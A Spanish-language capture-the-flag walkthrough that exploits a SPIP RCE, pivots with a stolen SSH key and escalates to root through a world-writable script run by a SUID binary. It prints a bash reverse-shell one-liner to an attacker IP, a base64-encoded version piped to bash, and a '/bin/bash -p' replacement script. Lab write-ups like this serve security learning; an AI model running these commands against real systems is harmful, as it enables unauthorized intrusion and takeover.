---
layout: apunte
title: "2. Finding the Flags"
---

<h2>Escaneo Inicial</h2>
Empezamos el reconocimiento inicial listando los puertos abiertos.

!**Pasted image 20260305181757.png**

Escaneamos dichos puertos más en profundidad.

!**Pasted image 20260305181839.png**

Vamos a proceder a enumerar directorios.

!**Pasted image 20260305181951.png**

Enumeramos más directorios.

!**Pasted image 20260305182518.png**

Escaneamos manualmente el sitio web en busca de pistas que puedan ayudarnos.

!**Pasted image 20260305182046.png**

Por lo que se ve parece que el vector de ataque va a ser Spip, vamos a ver qué es.

!**Pasted image 20260305182131.png**

-----------------------------------
<h2>Profundización</h2>
Vamos a buscar la versión de SPIP usada en el sitio web.

!**Pasted image 20260305182556.png**

Miramos el código fuente en busca de la versión.

!**Pasted image 20260305182637.png**

Parece que hemos encontrado la versión, ahora buscaremos un exploit.

!**Pasted image 20260305182716.png**

Hay un exploit RCE para nuestra versión de SPIP.

----------------------------------
<h2>Explotación</h2>
Copiamos el código en nuestra máquina y lo intentamos ejecutar.

Para hacer esto primero tenemos que preparar un payload y encodearlo para poder transmitir los caracteres especiales por HTTP.

```bash
bash -c 'bash -i >& /dev/tcp/IP_ATACANTE/PUERTO_ATACANTE 0>&1'
```

Tenemos que codificarlo en base 64 y luego pasarle por el pipe el decode de base64 y el comando de consola para que lo ejecute.

```bash
"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE1MS4xNDkvNDQ0NCAwPiYxCg== | base64 -d | bash"
```

Este será el payload en mi caso (para mi IP y el puerto 4444).

Ponemos el puerto en escucha (usaremos `rlwrap` para estabilizar la shell).

!**Pasted image 20260305183349.png**

Y procedemos a usar el exploit.

!**Pasted image 20260305183444.png**

Nos da un error por falta de dependencias. Vamos a editar el exploit.

!**Pasted image 20260305183551.png**

Volvemos a probar.

!**Pasted image 20260305183611.png**

Acabamos de ganar una consola.

!**Pasted image 20260305183635.png**

Ahora la estabilizamos.

!**Pasted image 20260305183723.png**

Vamos a buscar la flag.

!**Pasted image 20260305184012.png**

------------------------------------------
<h2>Pivotaje</h2>
Somos el usuario `www-data` por lo que necesitaremos pivotar hacia otro usuario. Aprovechando que estamos viendo un directorio `.ssh/` en el `home/` del usuario `think` vamos a ver si podemos ver la clave privada.

!**Pasted image 20260305184146.png**

Acabamos de encontrar una clave privada admitida por el servidor. Nos la copiaremos y la usaremos para iniciar sesión por ssh.

!**Pasted image 20260305184808.png**

--------------------------------------------
<h2>Escalada de Privilegios</h2>
Habiendo entrado ya por ssh comienza la gesta de intentar escalar los privilegios para poder leer la flag de root.

Después de probar un par de técnicas encontramos lo siguiente:

!**Pasted image 20260305185021.png**

El ejecutable `/usr/sbin/run_container` no es un binario SUID común en Linux, por lo que profundizaremos sobre él.

!**Pasted image 20260305185121.png**

Si nos fijamos en la respuesta del comando, parece que hay un error en `/opt/run_container.sh`. Vamos a ver qué pasa con él.

!**Pasted image 20260305185239.png**

>[!CAUTION] Tiene permisos 777, lo que implica que todo el mundo puede modificarlo, esto es un peligro.

Vamos a leerlo de todas formas pero parece que hemos encontrado nuestra gallina de los huevos de oro.

!**Pasted image 20260305185406.png**

Con razón falla, la función `validate_container_id` no está definida en todo el código. 

Pero bueno, vamos a sustituir todo este script por un simple:

```bash
#!/bin/bash
/bin/bash -p
```

El problema es que por algún motivo, pese a los permisos no nos deja modificarlo:

!**Pasted image 20260305191458.png**

Vamos a ver qué consola tiene nuestra sesión:

!**Pasted image 20260305191632.png**

Parece que no está usando bash.

Vamos a buscar directorios escribibles.

!**Pasted image 20260305192020.png**

Nos vamos al directorio `/dev/shm`. Allí copiamos `/bin/bash` y lo ejecutamos.

!**Pasted image 20260305192206.png**

Ahora ya tenemos una shell `bash` y podemos modificar `/opt/run_container.sh`.

!**Pasted image 20260305192309.png**

Por último ejecutamos el binario SUID, lo que nos devuelve una shell con privilegios y leemos la flag.

!**Pasted image 20260305192424.png**

>[!SUCCESS] Hemos conseguido las dos flags, pero la última ha sido difícil con el tema de `-ash` para poder pasarlo a `bash`.

